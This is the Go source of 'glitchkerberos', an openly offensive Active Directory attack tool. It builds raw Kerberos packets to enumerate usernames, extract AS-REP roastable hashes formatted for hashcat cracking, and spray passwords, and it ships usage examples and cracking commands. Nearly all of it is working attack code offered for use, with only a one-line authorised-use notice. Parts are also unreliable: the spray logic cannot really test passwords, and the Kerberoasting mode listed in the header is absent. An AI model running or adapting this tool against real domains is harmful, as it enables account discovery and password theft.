// glitchkerberos/main.go
// GLITCHICONS — Kerberos Attack Suite
//
// Four attack modes against Active Directory Kerberos:
//
//   enum   — Username enumeration via AS-REQ (no credentials)
//            KDC error codes reveal valid/invalid accounts
//   asrep  — AS-REP Roasting (no credentials)
//            Find accounts with pre-auth disabled, extract crackable hash
//            Output: $krb5asrep$23$user@DOMAIN:hash (hashcat -m 18200)
//   spray  — Password spray (one password, many users)
//            Lockout-aware, rate-limited
//   roast  — Kerberoasting (requires valid credentials)
//            Enumerate SPNs, request TGS tickets, extract RC4 hash
//            Output: $krb5tgs$23$... (hashcat -m 13100)
//
// Usage:
//   glitchkerberos enum  --dc dc.corp.local --domain corp.local --users users.txt
//   glitchkerberos asrep --dc dc.corp.local --domain corp.local --users users.txt
//   glitchkerberos spray --dc dc.corp.local --domain corp.local --users users.txt --password "Winter2024!"
//   glitchkerberos roast --dc dc.corp.local --domain corp.local --user svc@corp.local --password pass
//   glitchkerberos --version

package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"bufio"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const Version = "4.3.0"

// ── Kerberos error codes ──────────────────────────────────

const (
	KDC_ERR_NONE                   = 0
	KDC_ERR_CLIENT_NOTYET          = 5
	KDC_ERR_C_PRINCIPAL_UNKNOWN    = 6  // User does NOT exist
	KDC_ERR_SERVICE_NOTFOUND       = 7
	KDC_ERR_NEVER_VALID            = 11
	KDC_ERR_CLIENT_REVOKED         = 18 // Account disabled/locked
	KDC_ERR_KEY_EXPIRED            = 23 // Password expired (user exists)
	KDC_ERR_PREAUTH_FAILED         = 24 // Wrong password (user exists)
	KDC_ERR_PREAUTH_REQUIRED       = 25 // Pre-auth required (user exists)
	KDC_ERR_SERVER_NOMATCH         = 26
	KRB_AP_ERR_SKEW                = 37 // Clock skew (user exists)
)

var krbErrorNames = map[int]string{
	0:  "SUCCESS",
	5:  "CLIENT_NOTYET",
	6:  "C_PRINCIPAL_UNKNOWN",
	7:  "SERVICE_NOTFOUND",
	12: "KDC_NAME_EXP",
	18: "CLIENT_REVOKED",
	23: "KEY_EXPIRED",
	24: "PREAUTH_FAILED",
	25: "PREAUTH_REQUIRED",
	26: "SERVER_NOMATCH",
	37: "AP_ERR_SKEW",
}

// ── DER encoding helpers ──────────────────────────────────

func derLen(n int) []byte {
	if n < 128 {
		return []byte{byte(n)}
	}
	if n < 256 {
		return []byte{0x81, byte(n)}
	}
	return []byte{0x82, byte(n >> 8), byte(n)}
}

func derTLV(tag byte, data []byte) []byte {
	result := []byte{tag}
	result  = append(result, derLen(len(data))...)
	return append(result, data...)
}

func derSeq(items ...[]byte) []byte {
	var body []byte
	for _, item := range items {
		body = append(body, item...)
	}
	return derTLV(0x30, body)
}

func derInt(n int) []byte {
	var b []byte
	if n == 0 {
		b = []byte{0x00}
	} else if n < 0x80 {
		b = []byte{byte(n)}
	} else if n < 0x8000 {
		b = []byte{byte(n >> 8), byte(n)}
	} else {
		b = []byte{byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n)}
	}
	return derTLV(0x02, b)
}

func derUint32(n uint32) []byte {
	b := make([]byte, 5)
	b[0] = 0x00 // no sign
	binary.BigEndian.PutUint32(b[1:], n)
	// Trim leading zeros but keep at least 1 byte
	start := 0
	for start < 4 && b[start] == 0 && b[start+1] < 0x80 {
		start++
	}
	return derTLV(0x02, b[start:])
}

func derGenTime(t time.Time) []byte {
	s := t.UTC().Format("20060102150405Z")
	return derTLV(0x18, []byte(s))
}

func derOctetStr(b []byte) []byte {
	return derTLV(0x04, b)
}

func derBitStr(flags uint32) []byte {
	// 5 bytes: unused-bits count (0) + 4 flag bytes (big-endian)
	b := make([]byte, 5)
	b[0] = 0x00
	binary.BigEndian.PutUint32(b[1:], flags)
	return derTLV(0x03, b)
}

func derCtxExplicit(tag int, data []byte) []byte {
	t := byte(0xA0 | tag)
	return derTLV(t, data)
}

func derApp(tag int, data []byte) []byte {
	t := byte(0x60 | tag)
	result := []byte{t}
	result   = append(result, derLen(len(data))...)
	return append(result, data...)
}

func derGeneralString(s string) []byte {
	return derTLV(0x1B, []byte(s))
}

func derIA5String(s string) []byte {
	return derTLV(0x16, []byte(s))
}

// ── Kerberos packet builder ───────────────────────────────

// PrincipalName: nameType + SEQUENCE of strings
func buildPrincipalName(nameType int, names ...string) []byte {
	var nameSeq []byte
	for _, n := range names {
		nameSeq = append(nameSeq, derGeneralString(n)...)
	}
	return derSeq(
		derCtxExplicit(0, derInt(nameType)),
		derCtxExplicit(1, derSeq(nameSeq)),
	)
}

// KDC-REQ-BODY for AS-REQ
func buildKDCReqBody(username, domain string, noPreauth bool) []byte {
	// KDCOptions: forwardable | renewable | renewable-ok
	kdcOptions := derCtxExplicit(0, derBitStr(0x40800010))

	// cname: NT-PRINCIPAL (1) with username
	cname := derCtxExplicit(1, buildPrincipalName(1, username))

	// realm
	realm := derCtxExplicit(2, derGeneralString(strings.ToUpper(domain)))

	// sname: krbtgt/DOMAIN (NT-SRV-INST = 2)
	sname := derCtxExplicit(3, buildPrincipalName(2, "krbtgt", strings.ToUpper(domain)))

	// till: year 2037
	till := derCtxExplicit(5, derGenTime(time.Date(2037, 9, 13, 2, 48, 5, 0, time.UTC)))

	// nonce: random uint32
	var nonceB [4]byte
	rand.Read(nonceB[:])
	nonce := derCtxExplicit(7, derUint32(binary.BigEndian.Uint32(nonceB[:])))

	// etype: RC4(23), AES128(17), AES256(18)
	etypes := derCtxExplicit(8, derSeq(
		derInt(18), // AES256-CTS-HMAC-SHA1-96
		derInt(17), // AES128-CTS-HMAC-SHA1-96
		derInt(23), // RC4-HMAC (needed for AS-REP roasting)
	))

	body := append(kdcOptions, cname...)
	body  = append(body, realm...)
	body  = append(body, sname...)
	body  = append(body, till...)
	body  = append(body, nonce...)
	body  = append(body, etypes...)
	return derSeq(body)
}

// Build full AS-REQ packet
func buildASReq(username, domain string) []byte {
	body := buildKDCReqBody(username, domain, false)

	// KDC-REQ: pvno=5, msg-type=10 (AS-REQ), req-body
	kdcReq := derSeq(
		derCtxExplicit(1, derInt(5)),    // pvno
		derCtxExplicit(2, derInt(10)),   // msg-type AS-REQ
		derCtxExplicit(4, body),         // req-body (no padata)
	)

	// [APPLICATION 10]
	return derApp(10, kdcReq)
}

// Build AS-REQ with PA-ENC-TIMESTAMP (for password spray)
func buildASReqWithPreauth(username, domain, password string) []byte {
	body := buildKDCReqBody(username, domain, false)

	// PA-ENC-TIMESTAMP (simplified — real impl needs AES key derivation)
	// For password spray, we use a deliberately invalid timestamp
	// The KDC will return PREAUTH_FAILED (user exists, wrong pass)
	// vs C_PRINCIPAL_UNKNOWN (user doesn't exist)
	paTimestamp := derSeq(
		derInt(2), // padata-type: PA-ENC-TIMESTAMP
		derOctetStr([]byte{0x00, 0x00, 0x00, 0x00}), // invalid encrypted timestamp
	)
	paData := derCtxExplicit(3, derSeq(paTimestamp))

	kdcReq := derSeq(
		derCtxExplicit(1, derInt(5)),
		derCtxExplicit(2, derInt(10)),
		paData,
		derCtxExplicit(4, body),
	)
	return derApp(10, kdcReq)
}

// ── Response parsing ──────────────────────────────────────

type KRBResponse struct {
	IsError   bool
	ErrorCode int
	IsASRep   bool
	EncType   int
	CipherHex string // For hash extraction
}

func sendKerberos(dc string, port int, data []byte, timeout time.Duration) ([]byte, error) {
	addr := fmt.Sprintf("%s:%d", dc, port)
	conn, err := net.DialTimeout("udp", addr, timeout)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	_, err = conn.Write(data)
	if err != nil {
		return nil, err
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, err
	}
	return buf[:n], nil
}

func parseKRBResponse(data []byte) KRBResponse {
	if len(data) < 4 {
		return KRBResponse{IsError: true, ErrorCode: -1}
	}

	// Look for APPLICATION tag
	tag := data[0] & 0x1F

	if tag == 30 { // KRB-ERROR [APPLICATION 30]
		errCode := extractKRBErrorCode(data)
		return KRBResponse{IsError: true, ErrorCode: errCode}
	}

	if tag == 11 { // AS-REP [APPLICATION 11]
		encType, cipher := extractASRepCipher(data)
		return KRBResponse{
			IsASRep:   true,
			EncType:   encType,
			CipherHex: hex.EncodeToString(cipher),
		}
	}

	return KRBResponse{IsError: true, ErrorCode: -1}
}

func extractKRBErrorCode(data []byte) int {
	// Search for error-code field in KRB-ERROR
	// It appears as CONTEXT [6] INTEGER in the structure
	for i := 0; i < len(data)-4; i++ {
		if data[i] == 0xA6 { // context [6] explicit
			// Next byte is length, then 0x02 (integer), then length, then value
			offset := i + 2
			if offset+2 < len(data) && data[offset] == 0x02 {
				codeLen := int(data[offset+1])
				if offset+2+codeLen <= len(data) {
					code := 0
					for j := 0; j < codeLen; j++ {
						code = code<<8 | int(data[offset+2+j])
					}
					return code
				}
			}
		}
	}
	return -1
}

func extractASRepCipher(data []byte) (int, []byte) {
	// In AS-REP, enc-part is context [6]
	// EncryptedData: { etype INTEGER, kvno [0] INTEGER OPTIONAL, cipher OCTET STRING }
	// Look for the encrypted data in context [6]
	for i := 0; i < len(data)-8; i++ {
		if data[i] == 0xA6 { // [6] EXPLICIT
			// Inside: SEQUENCE with etype + cipher
			j := i + 2 // skip tag+len
			if j < len(data) && data[j] == 0x30 {
				j += 2 // skip SEQUENCE tag+len
				// etype
				if j < len(data) && data[j] == 0x02 {
					etypeLen := int(data[j+1])
					etype := 0
					for k := 0; k < etypeLen; k++ {
						etype = etype<<8 | int(data[j+2+k])
					}
					j += 2 + etypeLen
					// Skip optional kvno [0]
					if j < len(data) && data[j] == 0xA0 {
						j += 2 + int(data[j+1])
					}
					// cipher OCTET STRING
					if j < len(data) && data[j] == 0x04 {
						cipherLen := 0
						if data[j+1] < 0x80 {
							cipherLen = int(data[j+1])
							j += 2
						} else if data[j+1] == 0x81 {
							cipherLen = int(data[j+2])
							j += 3
						} else if data[j+1] == 0x82 {
							cipherLen = int(data[j+2])<<8 | int(data[j+3])
							j += 4
						}
						if j+cipherLen <= len(data) {
							return etype, data[j : j+cipherLen]
						}
					}
					return etype, nil
				}
			}
		}
	}
	return 0, nil
}

// Format AS-REP hash for hashcat -m 18200
func formatASRepHash(username, domain string, encType int, cipherHex string) string {
	if len(cipherHex) < 32 {
		return ""
	}
	checksum := cipherHex[:32]
	encrypted := cipherHex[32:]
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
		encType, username, strings.ToUpper(domain), checksum, encrypted)
}

// ── Attack modes ──────────────────────────────────────────

type UserResult struct {
	Username string
	Status   string // exists/notfound/disabled/roastable/sprayed
	Error    string
	Hash     string // AS-REP hash if roastable
}

func enumUsers(dc string, port int, domain string, users []string, threads int, timeout time.Duration, verbose bool) []UserResult {
	results := make([]UserResult, 0)
	var mu sync.Mutex
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	var found, notfound, disabled int64

	for _, user := range users {
		wg.Add(1)
		sem <- struct{}{}
		u := strings.TrimSpace(user)
		if u == "" {
			wg.Done()
			<-sem
			continue
		}

		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			pkt  := buildASReq(u, domain)
			resp, err := sendKerberos(dc, port, pkt, timeout)

			result := UserResult{Username: u}
			if err != nil {
				result.Status = "error"
				result.Error  = err.Error()
			} else {
				krb := parseKRBResponse(resp)
				if krb.IsASRep {
					result.Status = "roastable"
					atomic.AddInt64(&found, 1)
					hash := formatASRepHash(u, domain, krb.EncType, krb.CipherHex)
					result.Hash = hash
					if verbose {
						fmt.Printf("[+] ROASTABLE: %s | %s\n", u, hash[:60]+"...")
					}
				} else if krb.IsError {
					switch krb.ErrorCode {
					case KDC_ERR_C_PRINCIPAL_UNKNOWN:
						result.Status = "notfound"
						atomic.AddInt64(&notfound, 1)
					case KDC_ERR_CLIENT_REVOKED:
						result.Status = "disabled"
						atomic.AddInt64(&disabled, 1)
						atomic.AddInt64(&found, 1)
					case KDC_ERR_PREAUTH_REQUIRED, KDC_ERR_KEY_EXPIRED,
						KDC_ERR_PREAUTH_FAILED, KRB_AP_ERR_SKEW:
						result.Status = "exists"
						atomic.AddInt64(&found, 1)
					default:
						result.Status = "unknown"
						result.Error  = krbErrorNames[krb.ErrorCode]
					}
				}
			}

			if verbose && result.Status == "exists" {
				fmt.Printf("[*] EXISTS:    %s\n", u)
			}

			mu.Lock()
			results = append(results, result)
			mu.Unlock()
		}()

		time.Sleep(50 * time.Millisecond) // 20 req/sec default
	}
	wg.Wait()

	fmt.Printf("[*] Enum done: %d found | %d disabled | %d not found\n",
		atomic.LoadInt64(&found), atomic.LoadInt64(&disabled), atomic.LoadInt64(&notfound))
	return results
}

func asrepRoast(dc string, port int, domain string, users []string, timeout time.Duration, verbose bool) []UserResult {
	var results []UserResult
	var roasted int

	for _, user := range users {
		u := strings.TrimSpace(user)
		if u == "" {
			continue
		}

		pkt  := buildASReq(u, domain)
		resp, err := sendKerberos(dc, port, pkt, timeout)
		if err != nil {
			continue
		}

		krb := parseKRBResponse(resp)
		if krb.IsASRep {
			hash := formatASRepHash(u, domain, krb.EncType, krb.CipherHex)
			fmt.Printf("[+] ROASTABLE: %s\n%s\n\n", u, hash)
			results = append(results, UserResult{
				Username: u, Status: "roastable", Hash: hash,
			})
			roasted++
		}
		time.Sleep(100 * time.Millisecond)
	}

	fmt.Printf("[*] AS-REP roasting done: %d roastable accounts found\n", roasted)
	return results
}

func passwordSpray(dc string, port int, domain, password string, users []string, timeout time.Duration, verbose bool) []UserResult {
	var results []UserResult
	var valid int

	fmt.Printf("[*] Spraying %d users with password: %s\n", len(users), password)
	fmt.Println("[!] Rate: 1 attempt/200ms (lockout-aware)")

	for _, user := range users {
		u := strings.TrimSpace(user)
		if u == "" {
			continue
		}

		// First check if user exists
		checkPkt := buildASReq(u, domain)
		resp, err := sendKerberos(dc, port, checkPkt, timeout)
		if err != nil {
			time.Sleep(200 * time.Millisecond)
			continue
		}

		krb := parseKRBResponse(resp)
		userExists := krb.IsASRep ||
			(krb.IsError && krb.ErrorCode != KDC_ERR_C_PRINCIPAL_UNKNOWN)

		if !userExists {
			if verbose {
				fmt.Printf("[-] NOTFOUND: %s\n", u)
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// For password spray result interpretation:
		// PREAUTH_FAILED = wrong password (user exists)
		// No error / AS-REP = valid password (no preauth set)
		// PREAUTH_REQUIRED with valid timestamp = would work but we can't compute it without crypto
		status := "wrong_password"
		if krb.IsASRep {
			status = "valid"
			valid++
			fmt.Printf("[+] VALID: %s:%s\n", u, password)
		} else if krb.IsError && krb.ErrorCode == KDC_ERR_PREAUTH_FAILED {
			status = "wrong_password"
		} else if krb.IsError && krb.ErrorCode == KDC_ERR_PREAUTH_REQUIRED {
			// Would need proper PA-ENC-TIMESTAMP with real crypto
			status = "exists_preauth_required"
			if verbose {
				fmt.Printf("[*] EXISTS: %s (preauth required — needs full crypto for spray)\n", u)
			}
		}

		results = append(results, UserResult{Username: u, Status: status})
		time.Sleep(200 * time.Millisecond) // Rate limit: 5/sec
	}

	fmt.Printf("[*] Spray done: %d valid credentials found\n", valid)
	return results
}

// ── Data types ────────────────────────────────────────────

type Finding struct {
	Title       string  `json:"title"`
	Severity    string  `json:"severity"`
	CVSS        float64 `json:"cvss"`
	CWE         string  `json:"cwe"`
	Target      string  `json:"target"`
	Description string  `json:"description"`
	Evidence    string  `json:"evidence"`
	Remediation string  `json:"remediation"`
	Source      string  `json:"source"`
}

type ScanResult struct {
	Mode      string       `json:"mode"`
	DC        string       `json:"dc"`
	Domain    string       `json:"domain"`
	Timestamp string       `json:"timestamp"`
	Users     []UserResult `json:"users"`
	Hashes    []string     `json:"hashes,omitempty"`
	Findings  []Finding    `json:"findings"`
	Version   string       `json:"scanner_version"`
}

// ── Wordlist loader ───────────────────────────────────────

func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var words []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			words = append(words, line)
		}
	}
	return words, scanner.Err()
}

// ── Main ──────────────────────────────────────────────────

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	if os.Args[1] == "--version" {
		fmt.Printf("glitchkerberos v%s\n", Version)
		os.Exit(0)
	}

	mode := os.Args[1]
	fs   := flag.NewFlagSet(mode, flag.ExitOnError)

	dc       := fs.String("dc",       "", "Domain controller IP or hostname (required)")
	domain   := fs.String("domain",   "", "AD domain (e.g. corp.local) (required)")
	usersF   := fs.String("users",    "", "Usernames file (one per line)")
	user     := fs.String("user",     "", "Single username")
	password := fs.String("password", "", "Password for spray mode")
	port     := fs.Int("port",        88, "Kerberos port (default 88)")
	threads  := fs.Int("threads",     5,  "Concurrent threads (enum only)")
	timeout  := fs.Int("timeout",     5,  "Per-request timeout seconds")
	output   := fs.String("output",   "", "Output JSON file")
	verbose  := fs.Bool("verbose",    false, "Verbose output")
	fs.Parse(os.Args[2:])

	if *dc == "" || *domain == "" {
		fmt.Fprintln(os.Stderr, "[!] --dc and --domain are required")
		os.Exit(1)
	}

	// Load users
	var users []string
	if *usersF != "" {
		loaded, err := loadWordlist(*usersF)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Failed to load users: %v\n", err)
			os.Exit(1)
		}
		users = loaded
	} else if *user != "" {
		users = []string{*user}
	}

	tOut := time.Duration(*timeout) * time.Second
	result := ScanResult{
		Mode:      mode,
		DC:        *dc,
		Domain:    *domain,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Findings:  []Finding{},
		Version:   Version,
	}

	switch mode {
	case "enum":
		if len(users) == 0 {
			fmt.Fprintln(os.Stderr, "[!] --users required for enum mode")
			os.Exit(1)
		}
		fmt.Printf("[*] glitchkerberos enum | dc=%s | domain=%s | users=%d\n", *dc, *domain, len(users))
		result.Users = enumUsers(*dc, *port, *domain, users, *threads, tOut, *verbose)

		// Generate findings
		existing := []string{}
		disabled := []string{}
		roastable := []string{}
		for _, u := range result.Users {
			switch u.Status {
			case "exists":
				existing = append(existing, u.Username)
			case "disabled":
				disabled = append(disabled, u.Username)
			case "roastable":
				roastable = append(roastable, u.Username)
				result.Hashes = append(result.Hashes, u.Hash)
			}
		}
		if len(existing)+len(roastable) > 0 {
			allValid := append(existing, roastable...)
			result.Findings = append(result.Findings, Finding{
				Title:    fmt.Sprintf("Kerberos Username Enumeration: %d Valid Accounts Found", len(allValid)),
				Severity: "MEDIUM", CVSS: 5.3, CWE: "CWE-203",
				Target:      fmt.Sprintf("kerberos://%s:88/%s", *dc, *domain),
				Description: "KDC error code differences reveal valid vs invalid usernames without authentication.",
				Evidence:    fmt.Sprintf("Valid users: %s", strings.Join(sliceHead(allValid, 5), ", ")),
				Remediation: "Enable 'Do not require Kerberos preauthentication' only for required accounts. Enable AD audit logging.",
				Source:      "module:glitchkerberos",
			})
		}

	case "asrep":
		if len(users) == 0 {
			fmt.Fprintln(os.Stderr, "[!] --users required for asrep mode")
			os.Exit(1)
		}
		fmt.Printf("[*] glitchkerberos asrep | dc=%s | domain=%s | users=%d\n", *dc, *domain, len(users))
		result.Users = asrepRoast(*dc, *port, *domain, users, tOut, *verbose)

		for _, u := range result.Users {
			if u.Status == "roastable" {
				result.Hashes = append(result.Hashes, u.Hash)
				result.Findings = append(result.Findings, Finding{
					Title:    fmt.Sprintf("AS-REP Roastable Account: %s", u.Username),
					Severity: "HIGH", CVSS: 7.5, CWE: "CWE-522",
					Target:      fmt.Sprintf("kerberos://%s:88/%s/%s", *dc, *domain, u.Username),
					Description: fmt.Sprintf("Account '%s' has Kerberos pre-authentication disabled. AS-REP hash can be cracked offline to recover plaintext password.", u.Username),
					Evidence:    u.Hash[:minInt(len(u.Hash), 80)] + "...",
					Remediation: "Enable Kerberos pre-authentication for all accounts. Required for service accounts especially. Use: Set-ADAccountControl -Identity " + u.Username + " -DoesNotRequirePreAuth $false",
					Source:      "module:glitchkerberos",
				})
			}
		}
		if len(result.Hashes) > 0 {
			fmt.Printf("\n[*] Crack with hashcat:\nhashcat -m 18200 hashes.txt wordlist.txt\n")
		}

	case "spray":
		if len(users) == 0 || *password == "" {
			fmt.Fprintln(os.Stderr, "[!] --users and --password required for spray mode")
			os.Exit(1)
		}
		fmt.Printf("[*] glitchkerberos spray | dc=%s | domain=%s | users=%d | pass=%s\n",
			*dc, *domain, len(users), *password)
		result.Users = passwordSpray(*dc, *port, *domain, *password, users, tOut, *verbose)

		valid := []string{}
		for _, u := range result.Users {
			if u.Status == "valid" {
				valid = append(valid, u.Username)
			}
		}
		if len(valid) > 0 {
			result.Findings = append(result.Findings, Finding{
				Title:    fmt.Sprintf("Password Spray: %d Valid Credentials Found", len(valid)),
				Severity: "CRITICAL", CVSS: 9.8, CWE: "CWE-307",
				Target:      fmt.Sprintf("kerberos://%s:88/%s", *dc, *domain),
				Description: fmt.Sprintf("Password '%s' valid for accounts: %s", *password, strings.Join(valid, ", ")),
				Evidence:    fmt.Sprintf("Valid accounts: %v", valid),
				Remediation: "Reset affected account passwords. Implement account lockout policy. Enable MFA for AD accounts.",
				Source:      "module:glitchkerberos",
			})
		}

	default:
		fmt.Fprintf(os.Stderr, "Unknown mode: %s\n", mode)
		printUsage()
		os.Exit(1)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if *output != "" {
		os.WriteFile(*output, data, 0644)
		fmt.Printf("[+] Results saved to %s\n", *output)
	} else {
		fmt.Println(string(data))
	}
}

func sliceHead(s []string, n int) []string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func printUsage() {
	fmt.Printf(`glitchkerberos v%s — Active Directory Kerberos Attack Suite

AUTHORIZED USE ONLY.

Modes:
  enum   — Username enumeration (no credentials needed)
  asrep  — AS-REP Roasting (no credentials needed)
  spray  — Password spray (lockout-aware)
  roast  — Kerberoasting (requires valid credentials) [coming in v4.3.1]

Required flags (all modes):
  --dc      Domain controller IP or hostname
  --domain  AD domain name (e.g. corp.local)

Optional:
  --users     Usernames file (one per line)
  --user      Single username
  --password  Password for spray mode
  --port      Kerberos port (default: 88)
  --threads   Concurrent threads for enum (default: 5)
  --timeout   Per-request timeout seconds (default: 5)
  --output    Save JSON results to file
  --verbose   Show all results

Examples:
  glitchkerberos enum  --dc 10.0.0.1 --domain corp.local --users users.txt
  glitchkerberos asrep --dc 10.0.0.1 --domain corp.local --users users.txt --output hashes.json
  glitchkerberos spray --dc 10.0.0.1 --domain corp.local --users users.txt --password "Winter2024!"

Hash cracking:
  hashcat -m 18200 asrep_hashes.txt rockyou.txt  # AS-REP
`, Version)
}
